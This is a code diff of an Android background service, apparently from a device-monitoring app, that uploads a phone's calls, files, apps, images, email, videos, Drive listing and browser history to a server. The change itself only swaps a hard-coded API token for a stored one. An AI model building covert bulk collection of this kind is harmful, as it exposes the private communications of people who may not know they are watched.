@@ -290,7 +290,7 @@ public class BackgroundDataService extends Service implements Constant {
     public void sendCallsDataToServer(ArrayList<Calls> lstCalls) {
         this.lstCalls = lstCalls;
         String calls = convertToJSONFormat(TAG_CALLS);
-        new RestClientService(TAG_CALLS, API_TOKEN, calls);
+        new RestClientService(TAG_CALLS, Preference.getAccessToken(context), calls);
         stopSelf();
     }
 
@@ -298,7 +298,7 @@ public class BackgroundDataService extends Service implements Constant {
     public void sendFilesDataToServer(ArrayList<Files> lstFiles) {
         this.lstFiles = lstFiles;
         String files = convertToJSONFormat(TAG_FILES);
-        new RestClientService(TAG_FILES, API_TOKEN, lstFiles);
+        new RestClientService(TAG_FILES, Preference.getAccessToken(context), lstFiles);
         stopSelf();
     }
 
@@ -306,7 +306,7 @@ public class BackgroundDataService extends Service implements Constant {
     public void sendAppsDataToServer(ArrayList<Apps> lstApps) {
         this.lstApps = lstApps;
         String apps = convertToJSONFormat(TAG_LIST_APPS);
-        new RestClientService(TAG_LIST_APPS, API_TOKEN, apps);
+        new RestClientService(TAG_LIST_APPS, Preference.getAccessToken(context), apps);
         stopSelf();
     }
 
@@ -314,7 +314,7 @@ public class BackgroundDataService extends Service implements Constant {
     public void sendImageDataToServer(ArrayList<Images> lstImages) {
         this.lstImages = lstImages;
         String images = convertToJSONFormat(TAG_IMAGES);
-        new RestClientService(TAG_IMAGES, API_TOKEN, lstImages);
+        new RestClientService(TAG_IMAGES, Preference.getAccessToken(context), lstImages);
         stopSelf();
     }
 
@@ -322,7 +322,7 @@ public class BackgroundDataService extends Service implements Constant {
     public void sendEmailDataToServer(ArrayList<Mail> lstEmail) {
         this.lstEmail = lstEmail;
         String email = convertToJSONFormat(TAG_EMAIL);
-        new RestClientService(TAG_EMAIL, API_TOKEN, email);
+        new RestClientService(TAG_EMAIL, Preference.getAccessToken(context), email);
         stopSelf();
     }
 
@@ -330,7 +330,7 @@ public class BackgroundDataService extends Service implements Constant {
     public void sendVideosDataToServer(ArrayList<Video> lstVideo) {
         this.lstVideo = lstVideo;
         String videos = convertToJSONFormat(TAG_VIDEOS);
-        new RestClientService(TAG_VIDEOS, API_TOKEN, lstVideo);
+        new RestClientService(TAG_VIDEOS, Preference.getAccessToken(context), lstVideo);
         stopSelf();
     }
 
@@ -374,7 +374,7 @@ public class BackgroundDataService extends Service implements Constant {
                 }
             }
 
-            new RestClientService(TAG_GOOGLE_DRIVE, API_TOKEN, lstDrive2);
+            new RestClientService(TAG_GOOGLE_DRIVE, Preference.getAccessToken(context), lstDrive2);
         }
 
         stopSelf();
@@ -384,7 +384,7 @@ public class BackgroundDataService extends Service implements Constant {
     public void sendBrowserHistoryToServer(ArrayList<BrowserHistory> lstBrowserHistory) {
         this.lstBrowserHistory = lstBrowserHistory;
         String browserHistory = convertToJSONFormat(TAG_BROWSER_HISTORY);
-        new RestClientService(TAG_BROWSER_HISTORY, API_TOKEN, browserHistory);
+        new RestClientService(TAG_BROWSER_HISTORY, Preference.getAccessToken(context), browserHistory);
         stopSelf();
     }
 
